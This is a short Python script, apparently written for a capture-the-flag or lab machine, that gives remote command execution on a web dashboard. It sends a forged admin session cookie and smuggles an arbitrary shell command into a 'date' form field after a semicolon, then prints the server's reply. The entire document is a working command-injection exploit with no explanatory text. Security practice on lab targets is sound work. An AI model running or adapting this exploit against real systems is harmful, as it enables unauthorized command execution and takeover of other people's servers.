import requests
import sys

if len(sys.argv) < 2:
    print("Usage python3 rce.py <command>")
    sys.exit(1)

command = sys.argv[1]
url = "http://10.129.18.138:5000/dashboard"

headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
           "Cookie": "is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0"}

data = {"date": f"2023-09-15;{command}"}
response = requests.post(url, headers=headers, data=data)

print(response.text)
